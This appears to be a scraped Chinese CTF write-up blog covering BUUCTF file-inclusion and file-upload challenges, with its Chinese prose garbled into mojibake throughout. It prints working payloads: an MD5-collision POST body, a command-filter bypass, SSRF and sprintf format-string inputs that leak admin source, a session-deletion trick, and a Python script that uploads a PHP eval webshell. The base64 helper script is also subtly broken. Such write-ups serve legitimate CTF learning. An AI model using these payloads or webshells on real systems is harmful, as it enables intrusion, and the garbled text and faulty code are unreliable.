è¿›å…¥é¢˜ç›®ä¹‹åè§‚å¯Ÿurlï¼šhttp://4e78d6a5-8227-41e7-95d5-6b01336c4a5c.node3.buuoj.cn/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=ï¼Œimgçš„å‚æ•°æ¯”è¾ƒå¯ç–‘ï¼Œç”¨base64è§£ç ä¸€æ¬¡å¾—åˆ°MzUzNTM1MmU3MDZlNjc=ï¼Œæ„Ÿè§‰åˆè¦base64è§£ç ä¸€æ¬¡å¾—åˆ°3535352e706e67ï¼Œè¿™ä¸ªå°±æ¯”è¾ƒåƒ16è¿›åˆ¶äº†ï¼Œè½¬ç åå‘ç°æ˜¯555.pngï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶åŒ…å«ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬ç”Ÿæˆindex.phpçš„å‚æ•°ã€‚ 1234567import base64import binasciifilename=&#x27;index.php&#x27;.encode(&#x27;utf-8&#x27;)hex = binascii.b2a_hex(filename)encode_str = base64.encode(base64.encode(hex))print(encode_str) å¾—åˆ°index.phpçš„æºç ï¼š 123456789101112131415161718192021222324252627282930&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixiï½ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; ç¬¬ä¸€æ­¥md5ç¢°æ’ï¼Œå’Œæˆ‘ä¹‹å‰åœ¨è¿™ç¯‡æ–‡ç« BJDCTF2020 Easy MD5è®°å½•çš„ä¸€æ ·ï¼ŒPOSTæ•°æ®ï¼š 1a&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;b&#x3D;1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED ç¬¬äºŒæ­¥å°±æ˜¯ç»•è¿‡è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œéœ€è¦FUZZ Linuxå‘½ä»¤å»æ‰§è¡Œè¯»å–æ–‡ä»¶ï¼Œè¿™é‡Œæä¾›ä¸¤ä¸ªå‘½ä»¤ï¼šsortå’Œstringsã€‚ å¦å¤–ï¼Œè¿‡æ»¤åæ–œæ  |\\\\|\\\\\\\\|çš„è¿™ä¸¤ä¸ªæ­£åˆ™æ²¡æœ‰å†™å¥½ï¼Œå¯¼è‡´äº†åæ–œæ çš„é€ƒé€¸ï¼Œç›´æ¥ç”¨ca\\tå‘½ä»¤ã€‚ å…³äºè¿™ä¸ªåæ–œæ é€ƒé€¸æˆ‘æ˜¯çœŸçš„æ²¡å¤ªçœ‹æ‡‚ã€‚ã€‚ã€‚ BJDCTF2nd æ–‡ä»¶æ¢æµ‹ è€ƒç‚¹ æ–‡ä»¶åŒ…å« SSRF æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ Sessionç»•è¿‡ è§£é¢˜ æŸ¥çœ‹HTTPè¿”å›å¤´å‘ç°æœ‰ä¸€ä¸ªHintï¼šhome.phpï¼Œè®¿é—®åè§‚å¯Ÿurl fileå‚æ•°æ˜¯ä¸€ä¸ªæ–‡ä»¶åï¼Œç”¨phpä¼ªåè®®å°è¯•æ–‡ä»¶åŒ…å« home.phpæ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435&lt;?phpsetcookie(&quot;y1ng&quot;, sha1(md5(&#x27;y1ng&#x27;)), time() + 3600);setcookie(&#x27;your_ip_address&#x27;, md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]), time()+3600);if(isset($_GET[&#x27;file&#x27;]))&#123; if (preg_match(&quot;/\\^|\\~|&amp;|\\|/&quot;, $_GET[&#x27;file&#x27;])) &#123; die(&quot;forbidden&quot;); &#125; if(preg_match(&quot;/.?f.?l.?a.?g.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;not now!&quot;); &#125; if(preg_match(&quot;/.?a.?d.?m.?i.?n.?/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;You! are! not! my! admin!&quot;); &#125; if(preg_match(&quot;/^home$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; die(&quot;ç¦æ­¢å¥—å¨ƒ&quot;); &#125; else&#123; if(preg_match(&quot;/home$/i&quot;, $_GET[&#x27;file&#x27;]) or preg_match(&quot;/system$/i&quot;, $_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;].&quot;.php&quot;; &#125; else&#123; $file = $_GET[&#x27;file&#x27;].&quot;.fxxkyou!&quot;; &#125; echo &quot;ç°åœ¨è®¿é—®çš„æ˜¯ &quot;.$file . &quot;&lt;br&gt;&quot;; require $file; &#125;&#125; else &#123; echo &quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;;&#125; åŒæ ·çš„æ–¹å¼å¯ä»¥è¯»å–system.phpæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110&lt;?phperror_reporting(0);if (!isset($_COOKIE[&#39;y1ng&#39;]) || $_COOKIE[&#39;y1ng&#39;] !&#x3D;&#x3D; sha1(md5(&#39;y1ng&#39;)))&#123; echo &quot;&lt;script&gt;alert(&#39;why you are here!&#39;);alert(&#39;fxck your scanner&#39;);alert(&#39;fxck you! get out!&#39;);&lt;&#x2F;script&gt;&quot;; header(&quot;Refresh:0.1;url&#x3D;index.php&quot;); die;&#125;$str2 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#39;;$str3 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#39;;$str4 &#x3D; &#39;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#39;;?&gt;&lt;!DOCTYPE html PUBLIC &quot;-&#x2F;&#x2F;W3C&#x2F;&#x2F;DTD XHTML 1.0 Transitional&#x2F;&#x2F;EN&quot; &quot;http:&#x2F;&#x2F;www.w3.org&#x2F;TR&#x2F;xhtml1&#x2F;DTD&#x2F;xhtml1-transitional.dtd&quot;&gt;&lt;html xmlns&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;xhtml&quot;&gt;&lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt; &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt; &lt;title&gt;File Detector&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;normalize.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;demo.css&quot; &#x2F;&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;css&#x2F;component.css&quot; &#x2F;&gt; &lt;script src&#x3D;&quot;js&#x2F;modernizr.custom.js&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;section&gt; &lt;form id&#x3D;&quot;theForm&quot; class&#x3D;&quot;simform&quot; autocomplete&#x3D;&quot;off&quot; action&#x3D;&quot;system.php&quot; method&#x3D;&quot;post&quot;&gt; &lt;div class&#x3D;&quot;simform-inner&quot;&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;File Detector&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt; &lt;ol class&#x3D;&quot;questions&quot;&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ çŸ¥é“ç›®å½•ä¸‹éƒ½æœ‰ä»€ä¹ˆæ–‡ä»¶å—?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q1&quot; name&#x3D;&quot;q1&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q2&quot;&gt;è¯·è¾“å…¥ä½ æƒ³æ£€æµ‹æ–‡ä»¶å†…å®¹é•¿åº¦çš„url&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q2&quot; name&#x3D;&quot;q2&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;li&gt; &lt;span&gt;&lt;label for&#x3D;&quot;q1&quot;&gt;ä½ å¸Œæœ›ä»¥ä½•ç§æ–¹å¼è®¿é—®ï¼ŸGETï¼ŸPOST?&lt;&#x2F;label&gt;&lt;&#x2F;span&gt; &lt;input id&#x3D;&quot;q3&quot; name&#x3D;&quot;q3&quot; type&#x3D;&quot;text&quot;&#x2F;&gt; &lt;&#x2F;li&gt; &lt;&#x2F;ol&gt; &lt;button class&#x3D;&quot;submit&quot; type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&gt;æäº¤&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;controls&quot;&gt; &lt;button class&#x3D;&quot;next&quot;&gt;&lt;&#x2F;button&gt; &lt;div class&#x3D;&quot;progress&quot;&gt;&lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;number&quot;&gt; &lt;span class&#x3D;&quot;number-current&quot;&gt;&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;number-total&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;error-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;div&gt; &lt;&#x2F;div&gt; &lt;span class&#x3D;&quot;final-message&quot;&gt;&lt;&#x2F;span&gt; &lt;&#x2F;form&gt; &lt;span&gt;&lt;p&gt;&lt;center&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;gem-love.com&quot; target&#x3D;&quot;_blank&quot;&gt;@é¢–å¥‡L&#39;Amore&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&lt;&#x2F;p&gt;&lt;&#x2F;span&gt;&lt;&#x2F;section&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;classie.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;js&#x2F;stepsForm.js&quot;&gt;&lt;&#x2F;script&gt;&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt; var theForm &#x3D; document.getElementById( &#39;theForm&#39; ); new stepsForm( theForm, &#123; onSubmit : function( form ) &#123; classie.addClass( theForm.querySelector( &#39;.simform-inner&#39; ), &#39;hide&#39; ); var messageEl &#x3D; theForm.querySelector( &#39;.final-message&#39; ); form.submit(); messageEl.innerHTML &#x3D; &#39;Ok...Let me have a check&#39;; classie.addClass( messageEl, &#39;show&#39; ); &#125; &#125; );&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;&lt;?php$filter1 &#x3D; &#39;&#x2F;^http:\\&#x2F;\\&#x2F;127\\.0\\.0\\.1\\&#x2F;&#x2F;i&#39;;$filter2 &#x3D; &#39;&#x2F;.?f.?l.?a.?g.?&#x2F;i&#39;;if (isset($_POST[&#39;q1&#39;]) &amp;&amp; isset($_POST[&#39;q2&#39;]) &amp;&amp; isset($_POST[&#39;q3&#39;]) ) &#123; $url &#x3D; $_POST[&#39;q2&#39;].&quot;.y1ng.txt&quot;; $method &#x3D; $_POST[&#39;q3&#39;]; $str1 &#x3D; &quot;~$ python fuck.py -u \\&quot;&quot;.$url .&quot;\\&quot; -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint&#x3D;xiangdemei&lt;br&gt;&quot;; echo $str1; if (!preg_match($filter1, $url) )&#123; die($str2); &#125; if (preg_match($filter2, $url)) &#123; die($str3); &#125; if (!preg_match(&#39;&#x2F;^GET&#x2F;i&#39;, $method) &amp;&amp; !preg_match(&#39;&#x2F;^POST&#x2F;i&#39;, $method)) &#123; die($str4); &#125; $detect &#x3D; @file_get_contents($url, false); print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect));&#125;?&gt; é‡ç‚¹å…³æ³¨ååŠæ®µPHPä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥è·å–åˆ°ä»¥ä¸‹çš„é™åˆ¶æ¡ä»¶ï¼š 1.ä¸èƒ½åŒ…å«æœ‰flagå­—ç¬¦ä¸² 2.q2çš„å€¼å¿…é¡»ä»¥http://127.0.0.1/å¼€å¤´ï¼Œå…¶å®ç›¸å½“äºæ˜¯é™åˆ¶äº†åªèƒ½é€šè¿‡SSRFè¯»å–æ–‡ä»¶ 3.POSTè·å–äº†q1ã€q2ã€q3ä¸‰ä¸ªå€¼ï¼Œå…¶ä¸­q1å€¼å¹¶æ²¡æœ‰ä»€ä¹ˆé™åˆ¶ï¼Œq2åä¼šæ‹¼æ¥â€œ.y1ng.txtâ€å­—ç¬¦ä¸²ï¼Œq3ä¸­éœ€è¦ä»¥GETæˆ–POSTå­—ç¬¦ä¸²å¼€å¤´ã€‚ é¦–å…ˆæ˜¯æ— æ³•ç›´æ¥è¯»å–åˆ°flagæ–‡ä»¶ï¼Œé€šè¿‡home.phpæ–‡ä»¶çš„æºç æˆ‘ä»¬å¯ä»¥çŒœæµ‹åº”è¯¥è¿˜å­˜åœ¨admin.phpæ–‡ä»¶ã€‚å…¶æ¬¡å°±æ˜¯æˆ‘ä»¬ä¼ è¿›å»çš„URLå³q2å€¼ä¼šè¢«æ‹¼æ¥ä¸Šæ— ç”¨å­—ç¬¦ä¸²ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨URLååŠ  â€œ?a=(GETèµ‹å€¼ç»™ä¸€ä¸ªå‚æ•°)â€ æˆ– â€œ#(é”šç‚¹)â€ æ¥è®©å…¶å¤±æ•ˆï¼Œ æœ€åä¸€ä¸ªè€ƒçš„ç‚¹å°±æ˜¯åœ¨è¿™ä¸¤è¡Œä»£ç ä¸Šï¼š 12$detect = @file_get_contents($url, false);print(sprintf(&quot;$url method&amp;content_size:$method%d&quot;, $detect)); è¿™é‡Œç‰µæ‰¯åˆ°äº†å­—ç¬¦ä¸²çš„æ ¼å¼åŒ–çš„çŸ¥è¯†ï¼Œ%dä¼šå°†$detectä»¥äºŒè¿›åˆ¶æ•°çš„å½¢å¼è¾“å‡ºï¼Œæ‰€ä»¥å¹¶ä¸èƒ½å¾—åˆ°æˆ‘ä»¬éœ€è¦çš„æºç ã€‚ è€Œä¸»è¦æ€è·¯å°±æ˜¯è®©$detectä»¥å­—ç¬¦ä¸²å½¢å¼ï¼ˆ%sï¼‰æ¥è¾“å‡ºï¼Œæˆ‘ä»¬æœ‰ä¸¤ç§è¯»å–admin.phpæºç çš„æ–¹æ³•ï¼š %1$s â€”â€” è¿™ç§åŠæ³•åŸç†æ˜¯%1$sä¼šå°†ç¬¬ä¸€ä¸ªå‚æ•°ç”¨stringç±»å‹è¾“å‡ºï¼Œè€Œè¿™é“é¢˜ä¸­ç¬¬ä¸€ä¸ªå‚æ•°ä¾¿æ˜¯admin.phpçš„æºç ï¼Œè¯­å¥æ˜¯ï¼š 1print(sprintf(&quot;$url method&amp;content_size:&quot;GET%1$s%d&quot;, $detect)); &#x2F;&#x2F; %1$sä¼šä»¥å­—ç¬¦ä¸²æ ¼å¼è¾“å‡º$detectï¼Œè€Œ%dä¼šè¾“å‡º0 %s% â€”â€” è¿™ç§åŠæ³•çš„åŸç†æ˜¯sprintf()å‡½æ•°ä¸­%å¯ä»¥è½¬ä¹‰æ‰%ï¼Œè¿™æ ·è¯­å¥å°±å˜æˆäº†ï¼š 1print(sprintf(&quot;$url method&amp;content_size:&quot;GET%s%%d&quot;, $detect)); &#x2F;&#x2F; %då‰çš„%è¢«è½¬ä¹‰ æ„é€ å‡ºPayloadï¼ŒPOSTå‘é€ç»™system.phpå³å¯è·å¾—admin.phpçš„æºç ï¼š 1q1&#x3D;1&amp;q2&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;admin.php#&amp;q3&#x3D;GET%1$s admin.php 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?phperror_reporting(0);session_start();$f1ag = &#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;; //fakefunction aesEn($data, $key)&#123; $method = &#x27;AES-128-CBC&#x27;; $iv = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;],true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;function Check()&#123; if (isset($_COOKIE[&#x27;your_ip_address&#x27;]) &amp;&amp; $_COOKIE[&#x27;your_ip_address&#x27;] === md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) &amp;&amp; $_COOKIE[&#x27;y1ng&#x27;] === sha1(md5(&#x27;y1ng&#x27;))) return true; else return false;&#125;if ( $_SERVER[&#x27;REMOTE_ADDR&#x27;] == &quot;127.0.0.1&quot; ) &#123; highlight_file(__FILE__);&#125; else &#123; echo &quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot; . $_SERVER[&#x27;REMOTE_ADDR&#x27;];&#125;$_SESSION[&#x27;user&#x27;] = md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]);if (isset($_GET[&#x27;decrypt&#x27;])) &#123; $decr = $_GET[&#x27;decrypt&#x27;]; if (Check())&#123; $data = $_SESSION[&#x27;secret&#x27;]; include &#x27;flag_2sln2ndln2klnlksnf.php&#x27;; $cipher = aesEn($data, &#x27;y1ng&#x27;); if ($decr === $cipher)&#123; echo WHAT_YOU_WANT; &#125; else &#123; die(&#x27;çˆ¬&#x27;); &#125; &#125; else&#123; header(&quot;Refresh:0.1;url=index.php&quot;); &#125;&#125; else &#123; //I heard you can break PHP mt_rand seed mt_srand(rand(0,9999999)); $length = mt_rand(40,80); $_SESSION[&#x27;secret&#x27;] = bin2hex(random_bytes($length));&#125;?&gt; ä»£ç ä¸­ç¬¬ä¸€å±‚ifå¾ªç¯elseä»£ç å—ä¸­çš„mt_srandéšæœºæ•°æ˜¯çœŸéšæœºæ•°ï¼Œä¸èƒ½çˆ†ç ´ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªTrickï¼š sessionç»•è¿‡ã€‚åˆ é™¤cookieï¼Œæ²¡æœ‰cookieä¸­çš„SESSIONIDå°±æ‰¾ä¸åˆ°å¯¹åº”çš„sessionæ–‡ä»¶ï¼Œç›¸åº”çš„$_SESSION[â€˜varâ€™]å°±ä¸ºNULLï¼Œç›¸å½“äºä¼ å‚NULLã€‚ https://www.jianshu.com/p/9c031dee57b7 æ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨è®¿é—®admin.phpæ—¶ï¼Œåˆ é™¤sessionè®¿é—®ï¼Œä»£ç å°±ä¼šå˜æˆï¼š 1$cipher &#x3D; aesEn(&#39;&#39;, &#39;y1ng&#39;); å› æ­¤æˆ‘ä»¬å°±å¯ä»¥è®¡ç®—å‡ºå¯†é’¥ï¼Œä»è€Œè·å¾—Flagã€‚ æŠŠåŠ å¯†ç®—æ³•æ”¹ä¸€ä¸‹å¾—åˆ°ï¼š 1234567function aesEn($data, $key)&#123; $method &#x3D; &#39;AES-128-CBC&#39;; $iv &#x3D; md5(&#39;174.0.0.2&#39;,true); return base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));&#125;echo aesEn(&#39;&#39;, &#39;y1ng&#39;) NPUCTF2020 ezinclude è€ƒç‚¹ æ–‡ä»¶åŒ…å« php Segfault è§£é¢˜ ä¸€è¿›æ¥æç¤º uername/password errorï¼Œçœ‹çš„æˆ‘ä¸€è„¸æ‡µé€¼ã€‚æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼š 1&lt;!--md5($secret.$name)===$pass --&gt; æŸ¥çœ‹cookie ç›´æ¥ç»™äº†Hashå€¼ï¼ŒGETå‚æ•°pass=Hashå€¼ã€‚ è·³è½¬åˆ°404é¡µé¢ï¼Œä½†æ˜¯ä¸­é—´æ˜æ˜¾æœ‰ä¸€ä¸ªlocationé‡å®šå‘ï¼Œç”¨bpé‡æ”¾ã€‚ å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒPHPä¼ªåè®®è¯»ç‰©æ–‡ä»¶ index.php flflflflag.php æŸ¥çœ‹PHPç‰ˆæœ¬7.0.3ï¼Œå¯ä»¥ä½¿ç”¨PHP Segfaultä¸Šä¼ shell 1234567891011import requestsfrom io import BytesIOfile_data = &#123; &#x27;file&#x27;: BytesIO(b&quot;&lt;?php eval($_POST[cmd]);&quot;)&#125;url = &quot;http://db4c33c0-8231-45b5-8aec-dbcadfeb8704.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd&quot;try: r = requests.post(url=url, files=file_data, allow_redirects=False)except Exception as e: print(e) flagåœ¨phpinfoä¸­ã€‚","tags":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/tags/CTF/"}],"categories":[{"name":"CTF","slug":"CTF","permalink":"http://ca0y1h.top/categories/CTF/"},{"name":"æ–‡ä»¶åŒ…å«","slug":"CTF/æ–‡ä»¶åŒ…å«","permalink":"http://ca0y1h.top/categories/CTF/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶ä¸Šä¼ ","date":"2020-08-18T09:59:14.000Z","path":"Web_security/ctf_writeup/11.buuctfåˆ·é¢˜â€”â€”æ–‡ä»¶ä¸Šä¼ /","text":"æå®¢å¤§æŒ‘æˆ˜ 2019 Upload è€ƒç‚¹ phtmlç»•è¿‡åç¼€ scriptç»•è¿‡&lt;? è§£é¢˜ ACTF2020 æ–°ç”Ÿèµ› Upload è€ƒç‚¹ phtmlåç¼€ç»•è¿‡ è§£é¢˜ GXYCTF2019 BabyUpload è€ƒç‚¹ .htaccessè§£æç»•è¿‡ è§£é¢˜ RoarCTF 2019 SimpleUpload è€ƒç‚¹ æ¡ä»¶ç«äº‰ è§£é¢˜ æ ¹æ®æŠ¥é”™ä¿¡æ¯ï¼Œå‘ç°æ˜¯ThinkPHP3.2.4ç‰ˆæœ¬ï¼Œä»GitHubä¸Šä¸‹è½½ä¸‹æ¥å®¡è®¡ä¸€ä¸‹ï¼Œå‘ç°ä¸Šä¼ æ¨¡å—æœ‰ä¸€ä¸ªé—®é¢˜ã€‚ å¯ä»¥çœ‹åˆ°ï¼Œç”¨æˆ·æ‰€å†™å¾—ä»£ç ä½¿ç”¨æ—¶æœªæŒ‡å®šfilesï¼Œé»˜è®¤ä¸º$_FILESï¼Œè¿™æ„å‘³ç€ï¼Œæ‰€æœ‰$_FILESä¸­çš„æ–‡ä»¶éƒ½ä¼šè¢«ä¸Šä¼ ã€‚è€Œä»£ç åªä¼šè¿‡æ»¤$_FILES['file']ä¸­çš„æ–‡ä»¶ã€‚æ‰€ä»¥ä¸Šä¼ ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¸€ä¸ªnameä¸ºfileçš„æ­£å¸¸å›¾ç‰‡ï¼Œå¦ä¸€ä¸ªnameä¸ºå…¶ä»–çš„webshellã€‚ 12$url = __ROOT__.substr($upload-&gt;rootPath,1).$info[&#x27;file&#x27;][&#x27;savepath&#x27;].$info[&#x27;file&#x27;][&#x27;savename&#x27;] ;echo json_encode(array(&quot;url&quot;=&gt;$url,&quot;success&quot;=&gt;1)); æœ€åä¼šæ‰“å°å‡º$_FILES['file']çš„æ–‡ä»¶åœ°å€ï¼Œè€Œä¸ä¼šæ‰“å°æˆ‘ä»¬shellçš„åœ°å€ã€‚ ThinkPHP3é»˜è®¤ä½¿ç”¨uniqid()å‡½æ•°æ ¹æ®æ—¶é—´ç”Ÿæˆæ–‡ä»¶åï¼Œä¸¤ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶é—´ç›¸è¿‘å¯ä»¥çˆ†ç ´ã€‚ æœ€åä¸Šä¼ çš„phpä¼šè¢«åå°æ›¿æ¢æˆflagã€‚ å¼ºç½‘æ¯ 2019 Upload è€ƒç‚¹ PHPååºåˆ—åŒ–POPé“¾æ„é€  è§£é¢˜ æ³¨å†Œä¹‹åæŸ¥çœ‹cookieå‘ç°æ˜¯ä¸€ä¸ªbase64ç¼–ç åçš„ 1a:5:&#123;s:2:&quot;ID&quot;;i:3;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:5:&quot;email&quot;;s:15:&quot;admin@admin.com&quot;;s:8:&quot;password&quot;;s:32:&quot;21232f297a57a5a743894a0e4a801fc3&quot;;s:3:&quot;img&quot;;N;&#125; æ‰«ç›®å½•å¾—åˆ° www.tar.gz å‹ç¼©åŒ…ï¼Œä»£ç å®¡è®¡ ç”¨PHPStormæ‰“å¼€ä¼šå‘ç°æœ‰ä¸¤ä¸ªæ–­ç‚¹ï¼Œåº”è¯¥æ˜¯ç»™çš„hint Register.php Index.phpä¸­æœ‰ä¸€ä¸ªæŠŠcookieååºåˆ—åŒ–çš„åœ°æ–¹ã€‚ è¿™ä¹ˆæ¥çœ‹åº”è¯¥æ˜¯æ„é€ ååºåˆ—åŒ–çš„POPé“¾ã€‚ åœ¨Profile.phpå‘ç°å…³é”®ä»£ç ï¼š 1234567891011public function __get($name)&#123; return $this-&gt;except[$name];&#125;public function __call($name, $arguments)&#123; if($this-&gt;&#123;$name&#125;)&#123; $this-&gt;&#123;$this-&gt;&#123;$name&#125;&#125;($arguments); &#125;&#125; 